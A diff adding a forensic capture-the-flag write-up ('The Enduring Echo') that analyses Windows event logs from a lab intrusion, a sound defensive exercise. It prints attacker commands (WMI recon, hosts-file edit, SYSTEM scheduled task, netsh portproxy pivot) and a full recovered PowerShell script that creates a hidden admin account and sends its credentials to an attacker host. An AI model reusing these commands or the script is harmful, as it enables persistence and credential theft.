@@ -348,3 +348,412 @@ Conclusion:
 ```velocity
 He's a ghost I carry, not to haunt me, but to hold me together - NULLINC REVENGE
 ```
+# Holmes CTF 2025 – The Enduring Echo
+
+Challenge name:**The Enduring Echo**
+Difficulty:**Easy**
+Describe:LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.
+## Question 1:What was the first (non cd) command executed by the attacker on the host? (string)
+
+**Evidence & where it was found**
+
+![Organization Evidence](images/holmes_2025/the_enduring_echo/anh1.png)
+
+- I located the process creation event in the Windows Security log (Event ID 4688 — A new process has been created).
+- The NewProcessName is C:\Windows\System32\cmd.exe
+- The CommandLine field for this event is:
+
+```velocity
+cmd.exe /Q /c systeminfo 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1
+```
+- That command line shows cmd.exe launching systeminfo and redirecting its output (1>) to \\127.0.0.1\ADMIN$\__1756075857.955773, with stderr (2>&1) merged into stdout.
+
+**Interpretation**
+
+1. The first non-cd command executed by the attacker was systeminfo. The presence of cmd.exe /Q /c systeminfo confirms systeminfo is the actual command the attacker ran.
+
+2. systeminfo is a common reconnaissance command — it prints operating system and system configuration information (OS version, build, installed hotfixes, hardware info, boot time, etc.). Attackers often run it early to learn system details (OS build, domain membership, etc.) that help plan next steps or choose appropriate exploits/tools.
+
+3. The redirection portion 1> \\127.0.0.1\ADMIN$\__1756075857.955773 is notable:
+
+- The attacker attempted to write the command output to a network path (an SMB share). \\127.0.0.1\ADMIN$ would target the local host’s administrative share — this pattern can indicate an attempt to exfiltrate output via SMB, stage files, or simply to persist output somewhere accessible.
+- The use of 127.0.0.1 is odd if the intent was remote exfiltration (127.0.0.1 resolves to localhost). It could mean: a misuse/mistake, an attempt to avoid detection by writing to the admin share via loopback, or the attacker was running the same command through a lateral- or proxy-type setup where 127.0.0.1 is meaningful in that context (for example, a pivoted session).
+
+4. Parent process (ParentProcessName) is C:\Windows\System32\wbem\WmiPrvSE.exe. That strongly suggests the systeminfo invocation was launched by the WMI Provider Host process — typical when a remote WMI command was used (remote command execution via WMI) or when a scheduled/remote management task invoked cmd.exe. This indicates remote execution through WMI or a WMI-based management tool rather than an interactive local console.
+
+**Why this matters**
+
+1. Running systeminfo early is consistent with discovery activity. Combined with the fact it was launched by WmiPrvSE.exe and redirected to an admin share, this event indicates the attacker was performing automated discovery and trying to capture results in a location accessible to their process.
+2. This event is a helpful starting point for an investigation: it gives the first clear indicator of attacker activity (a specific command and its redirection), and it suggests a remote vector (WMI) to investigate further.
+
+**onclusion:**
+
+The first User-Agent used by the attacker is:
+```velocity
+systeminfo
+```
+## Question 2: Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
+-Similarly, in question 1, the answer is
+
+**Conclusion:**
+
+```velocity
+C:\Windows\System32\wbem\WmiPrvSE.exe
+```
+## Question 3:Which remote-execution tool was most likely used for the attack? (filename.ext)
+
+**Conclusion:**
+
+```velocity
+wmiexec.py
+```
+
+**Evidence & where it was found**
+
+1. The parent process spawning the attacker’s commands is C:\Windows\System32\wbem\WmiPrvSE.exe (WMI Provider Host), and the first observed command line was cmd.exe /Q /c systeminfo 1> \\127.0.0.1\ADMIN$\__1756075857.955773 2>&1.
+
+2. The combination of:
+
+- remote process creation via the WMI provider host,
+- execution of standard shell commands via cmd.exe, and
+- output redirection to an ADMIN$ share
+strongly points to a WMI-based remote execution technique.
+
+3. wmiexec.py (from the Impacket tools) is a well-known utility that performs remote command execution via WMI and produces the exact behavioral pattern: it creates processes on the remote host through WMI (which show up with WmiPrvSE.exe as the parent) and often uses redirection or temporary files to capture command output.
+
+**Why wmiexec.py (and not other tools)**
+
+1. Behavioral match: wmiexec.py uses the WMI services to spawn processes remotely. When you run wmiexec.py against a target, the remote host will typically show WmiPrvSE.exe as the parent of the spawned cmd.exe process in Event ID 4688 records. That exact parent-child relationship is present in your logs.
+
+2. Simplicity & output handling: wmiexec.py captures stdout/stderr from commands executed remotely. Attackers often redirect outputs to ADMIN$ or other shares as part of their workflow; this is consistent with the 1> \\127.0.0.1\ADMIN$\__... 2>&1 redirection we saw.
+
+3. Alternatives considered: Other remote-exec tools (e.g., psexec.py, smbexec, native wmic, winrm, or PowerShell remoting) also cause remote process creation, but:
+
+- psexec variants typically use the Service Control Manager (showing services.exe/svchost involvement) rather than WmiPrvSE.exe.
+- wmic may show similar parentage, but wmic is a built-in client and often appears differently in logs and in how output is handled.
+- PowerShell remoting uses WinRM and different service parents (e.g., winrm.exe/svchost), and often shows powershell.exe command lines including -EncodedCommand.
+
+4. Given the concrete evidence (WMI parent process + cmd-based commands + admin-share output capture) the most likely third-party tool used is wmiexec.py. This is a classic and common tool used in red team and attacker toolkits for WMI-based remote execution.
+
+**Interpretation (attack context)**
+
+1. The attacker used WMI to execute reconnaissance commands (systeminfo) remotely. This is typically an early post-exploitation step to profile the host and confirm access.
+
+2. Using wmiexec.py provides a non-interactive, stealthy channel to run commands without an interactive shell, which reduces noise and leaves a trail primarily in event logs (4688) rather than interactive user logs.
+
+## Question 4: What was the attacker’s IP address? (IPv4 address)
+
+**Evidence & where it was found**
+
+![Organization Evidence](images/holmes_2025/the_enduring_echo/anh2.png)
+
+1. I examined the relevant Windows Security Event (Event ID 4688 — A new process has been created).
+
+2. The CommandLine field in that event contains:
+
+```velocity
+cmd /C "echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"
+```
+
+3. This command clearly contains the IPv4 address 10.129.242.110 which the attacker wrote into the local hosts file along with the hostname NapoleonsBlackPearl.htb.
+
+**Interpretation**
+
+1. The attacker executed a simple echo redirection to append a line to the system hosts file. The line being appended maps the hostname NapoleonsBlackPearl.htb to the IP 10.129.242.110.
+
+2. This is a local DNS override technique: by inserting the mapping into C:\Windows\System32\drivers\etc\hosts, the attacker ensures that any process on the host resolving NapoleonsBlackPearl.htb will get 10.129.242.110 instead of using the network DNS.
+
+3. Common motivations for this action:
+
+- Command-and-control (C2) reachability — forcing the hostname to point to an attacker-controlled IP so malware or scripts can contact it directly.
+- Credential harvesting / redirecting legitimate services — causing calls to an internal or external named resource to reach an attacker-controlled host.
+- Phishing / tooling convenience — making it easier to access a lab or named host without DNS changes.
+
+4. The technique is low-noise and persistent (survives reboots) until someone edits the hosts file, so it’s often used by attackers to ensure a reliable mapping.
+
+**Context from other events**
+
+1. The parent process for this cmd.exe invocation was C:\Windows\System32\cmd.exe (i.e., a command shell), and earlier events showed WMI (WmiPrvSE.exe) as the creator of shell commands — together these indicate the host was being controlled remotely (likely via wmiexec.py or another WMI-based tool) and used to modify the hosts file.
+
+**Why this matters**
+
+1. Manipulating the hosts file is a clear sign of attempted environment manipulation by the attacker. Even if the IP 10.129.242.110 is an internal address (the 10. prefix is private), it's important because it shows where the attacker wants traffic to go from the compromised host.
+
+2. If the attacker’s infrastructure resides at that IP (or if it points to another compromised machine), it may be part of lateral movement or an internal rendezvous point for malware.
+
+**Conclusion:**
+
+```velocity
+10.129.242.110
+```
+
+## Question 5:What is the first element in the attacker's sequence of persistence mechanisms? (string)
+
+**Evidence & where it was found**
+
+![Organization Evidence](images/holmes_2025/the_enduring_echo/anh3.png)
+
+1. I inspected the relevant Windows Security Event (Event ID 4688 — A new process has been created).
+
+2. The CommandLine field shows the attacker created a scheduled task:
+
+```velocity
+schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f
+```
+3. The NewProcessName is C:\Windows\System32\schtasks.exe and the ParentProcessName is C:\Windows\System32\cmd.exe, so the command shell created the scheduled task using schtasks.exe.
+
+4. The task name is explicitly "SysHelper Update" — this is the persistence artifact name the attacker chose.
+
+**Interpretation**
+
+1. The attacker used schtasks.exe to create a scheduled task named SysHelper Update that runs a PowerShell script (JM.ps1) from the user’s AppData folder.
+
+2. Details from the command line:
+
+- /sc minute /mo 2 — the task is scheduled to run every 2 minutes (very frequent), indicating the attacker wanted a reliably persistent, near-continuous execution.
+- /ru SYSTEM — the task runs as SYSTEM, giving it high privileges.
+- ExecutionPolicy Bypass -WindowStyle Hidden — these flags are typical when attackers try to run PowerShell scripts stealthily and avoid execution policy controls.
+/f forces creation/overwriting of the task if it exists.
+
+3. This scheduled task is a classic persistence technique: it ensures the malicious script is executed repeatedly and with elevated privileges even after reboots or user logoffs.
+
+**Why this matters**  
+
+1. As the first observed persistence element, SysHelper Update likely represents the initial mechanism the attacker installed to maintain access to the host.
+
+2. Because it runs as SYSTEM and executes a script from a user-writable folder (C:\Users\Werni\Appdata\Local\JM.ps1), it provides a highly reliable foothold and a convenient location for the attacker to update or swap the payload.
+
+3. The extremely short interval (every 2 minutes) suggests the attacker intended near-continuous control or wanted rapid re-establishment if their payload was terminated.
+
+**Conclusion:**
+
+```velocity
+SysHelper Update
+```
+## Question 6:Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)
+
+-Similarly, in question 5, the answer is
+
+**Conclusion:**
+
+```velocity
+C:\Users\Werni\Appdata\Local\JM.ps1
+```
+
+## Question 7:What local account did the attacker create? (string)
+
+**Evidence & where it was found**
+
+1. Windows Security log (Event ID 4720 — User Account Created):
+
+- he XML view of the 4720 event shows TargetUserName = svc_netupd. This is a direct event that records the creation of a local user account. The presence of this field is authoritative evidence the account was created on the host.
+
+2. Malicious script JM.ps1 (recovered from C:\Users\Werni\AppData\Local\JM.ps1):
+
+- The script contains:
+
+```velocity
+# List of potential usernames
+$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")
+
+# Check for existing user
+$existing = $usernames | Where-Object {
+    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
+}
+
+# If none exist, create a new one
+if (-not $existing) {
+    $newUser = Get-Random -InputObject $usernames
+    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
+    $password = "Watson_$timestamp"
+
+    $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+
+    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
+    Add-LocalGroupMember -Group "Administrators" -Member $newUser
+    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser
+
+    # Enable RDP
+    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+}
+```
+
+![Organization Evidence](images/holmes_2025/the_enduring_echo/anh3.png)
+
+-and logic that checks for existing users and, if none exist, picks one at random:
+-That shows the script’s intent: create a user from that list, add it to the Administrators and Remote Desktop Users groups.
+
+3. Correlation
+
+- The scheduled task SysHelper Update (created earlier) runs JM.ps1 every 2 minutes as SYSTEM. That task + the script explain why the user creation event occurred and why svc_netupd (one of the candidate names) was created.
+
+**Interpretation**
+
+1. svc_netupd was created by the attacker as a local service-style account. The script intentionally:
+
+- Generates a randomized password (Watson_<timestamp>),
+- Creates the user with a plausible service name (Windows Update Helper),
+- Escalates privileges by adding the account to the Administrators group, and
+- Adds it to Remote Desktop Users and enables RDP, facilitating remote interactive access.
+
+2. The account name svc_netupd is consistent with the script’s naming scheme designed to blend in (service-like names).
+
+3. The attacker also attempts to exfiltrate credentials by encoding the <username>|<password> pair in Base64 and calling:
+
+```velocity
+http://NapoleonsBlackPearl.htb/Exchange?data=<base64>
+```
+So not only was the account created, its credentials were likely sent to the attacker-controlled host.
+**Conclusion:**
+```velocity
+svc_netupd
+```
+## Question 8: What domain name did the attacker use for credential exfiltration? (domain)
+
+**Evidence & where it was found**
+
+- The malicious PowerShell script JM.ps1 recovered from C:\Users\Werni\AppData\Local\JM.ps1 contains this line near the end of the script:
+```velocity
+Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
+```
+- This shows the script explicitly sends the newly created account and password (concatenated as <username>|<password> and then base64-encoded) to the /Exchange endpoint on the host NapoleonsBlackPearl.htb.
+- Complementary evidence: an earlier command appended an entry to the hosts file:
+```velocity
+cmd /C "echo 10.129.242.110 NapoleonsBlackPearl.htb >> C:\Windows\System32\drivers\etc\hosts"
+```
+This maps NapoleonsBlackPearl.htb to 10.129.242.110, ensuring that the HTTP request in the script resolves to that IP.
+
+**Interpretation**
+
+- The attacker used NapoleonsBlackPearl.htb as the exfiltration domain. The script builds a base64-encoded payload containing the created username and password and sends it via HTTP to http://NapoleonsBlackPearl.htb/Exchange.
+- Modifying the local hosts file to point that domain to 10.129.242.110 ensures the request reaches the intended infrastructure even if DNS would not resolve the name normally — a common tactic when using internal lab or private infrastructure.
+- This pattern (local hosts mapping + HTTP exfiltration) indicates the attacker wanted reliable delivery of credentials to their collection server and likely used that server to harvest credentials and coordinate further activity.
+
+**Conclusion:**
+```velocity
+NapoleonsBlackPearl.htb
+```
+## Question 9: What password did the attacker's script generate for the newly created user? (string)
+
+**Evidence & where it was found**
+
+1 . Malicious script (JM.ps1) — recovered from C:\Users\Werni\AppData\Local\JM.ps1:
+The script contains these lines (paraphrased):
+
+```velocity
+$timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
+$password = "Watson_$timestamp"
+$securePass = ConvertTo-SecureString $password -AsPlainText -Force
+New-LocalUser -Name $newUser -Password $securePass ...
+```
+
+- This shows the password is formed by concatenating the literal Watson_ with a timestamp string in the format yyyyMMddHHmmss.
+
+2. Windows Security event timestamp — Event metadata shown in the Event Viewer XML includes:
+
+```velocity
+<TimeCreated SystemTime="2025-08-24T23:05:09.7646587Z" />
+<EventData>
+  <Data Name="TargetUserName">svc_netupd</Data>
+  ...
+</EventData>
+```
+- This event corresponds to the account creation (TargetUserName svc_netupd). The SystemTime value is in UTC.
+
+![Organization Evidence](images/holmes_2025/the_enduring_echo/anh5.png)
+3. Timezone / timestamp adjustment — The forensic view of the host shows the system time zone is Pacific Time (ActiveTimeBias 420), which is UTC−07:00. Converting the UTC event time 2025-08-24T23:05:09Z to local Pacific time gives 2025-08-24 16:05:09. Formatting that local time as yyyyMMddHHmmss produces 20250824160509. Prepending Watson_ yields the final password: Watson_20250824160509.
+
+**Conclusion:**
+```velocity
+Watson_20250824160509
+```
+## Question 10: What was the IP address of the internal system the attacker pivoted to? (IPv4 address)
+
+**Evidence & where it was found**
+
+- he Windows Security Event (Event ID 4688 — A new process has been created) shows the attacker executed netsh.exe.
+- The CommandLine field contains:
+
+```velocity
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
+```
+![Organization Evidence](images/holmes_2025/the_enduring_echo/anh6.png)
+
+- This command explicitly sets up a port forwarding rule that forwards local traffic on port 9999 (listening on all interfaces 0.0.0.0) to 192.168.1.101:22 (SSH on the internal host). The connectaddress=192.168.1.101 value is the pivot target.
+
+**Interpretation**
+
+- The attacker created a portproxy using netsh to forward traffic from the compromised host to an internal machine at 192.168.1.101. Traffic connecting to the compromised host on port 9999 will be forwarded to port 22 on that internal IP — effectively providing remote access to the internal host via the compromised machine (a common pivoting technique).
+- listenaddress=0.0.0.0 makes the proxy listen on all network interfaces, so the attacker (or other systems) can reach the forwarded SSH port from anywhere that can reach the compromised host.
+- Because the forwarded target port is 22 (SSH), the goal was almost certainly to provide remote SSH access to the internal host without direct network access to it — i.e., tunneling/pivoting.
+
+**Conclusion:**
+```velocity
+192.168.1.101
+```
+## Question 11: Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)
+
+-Similarly, in question 10, the answer is
+**Conclusion:**
+```velocity
+9999
+```
+## Question 12: What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM\...\...)
+
+**Analysis**
+
+- When attackers configure port forwarding on a Windows host using the command:
+```velocity
+netsh interface portproxy add v4tov4 listenport=... listenaddress=... connectport=... connectaddress=...
+```
+- these settings are not just temporary. They are saved in the Windows Registry so they survive reboots.
+- The relevant registry hive is under the Services\PortProxy key. Specifically, for IPv4 → IPv4 TCP forwarding, Windows stores the persistent rules in the following path:
+
+**Conclusion:**
+```velocity
+HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
+```
+## Question 13: What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)
+
+**Analysis**
+
+1. From Question 12, we determined the attacker configured persistent port forwarding using the Windows netsh interface portproxy feature. This technique allows them to redirect traffic from one IP/port to another, enabling lateral movement or pivoting into internal systems
+
+2. According to the MITRE ATT&CK framework:
+
+- The tactic is Defense Evasion / Lateral Movement.
+- The technique is Proxy: External Proxy.
+- The specific sub-technique for port forwarding / port proxying is:
+
+**Conclusion:**
+```velocity
+T1090.001
+```
+## Question 14: Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)
+
+**Evidence & where it was found**
+
+- In the forensic output (ConsoleHost_history and other collected text artifacts shown in Autopsy), the command appears verbatim among the recorded administrator commands. The extracted text window includes the reg add invocation used to enable command-line capture.
+- Additional contextual evidence: subsequent security events (Event ID 4688) in the provided logs contain full CommandLine fields for cmd.exe/powershell.exe invocations, showing that command-line auditing was indeed active when the attacker executed commands.
+Interpretation
+- The reg add command writes a DWORD value named ProcessCreationIncludeCmdLine_Enabled with value 1 into the registry path:
+
+```velocity
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit
+```
+- Setting this value to 1 enables Windows’ feature to include process command-line information in process creation audit records (4688). In modern Windows versions this is one of the steps required so that the Security log records full command lines for spawned processes.
+- This change makes process creation events significantly richer — instead of only seeing NewProcessName (the binary path), the CommandLine field will contain the exact arguments and commands executed. That is exactly how you were able to see the attacker’s full command lines (for example, the echo ... >> hosts line, netsh interface portproxy and the scheduled task creation).
+Why this matters
+- From a defensive perspective, enabling command-line auditing is highly valuable — it transforms event logs from coarse indicators into actionable forensic evidence. In this case 
+it allowed investigators to identify attacker TTPs (WMI remote execution, scheduled tasks, hosts file manipulation, portproxy pivoting) with concrete command strings and arguments.
+- From an operational perspective, organizations should balance the value of detailed logging with storage and privacy considerations (command lines can include sensitive data). The registry change is a deliberate, system-level switch and should be documented and monitored.
+- Attackers are less likely to hide their behavior when command-line logging is enabled — it makes post-compromise detection and attribution much easier.
+
+![Organization Evidence](images/holmes_2025/the_enduring_echo/anh7.png)
+
+**Conclusion:**
+```velocity
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
+```
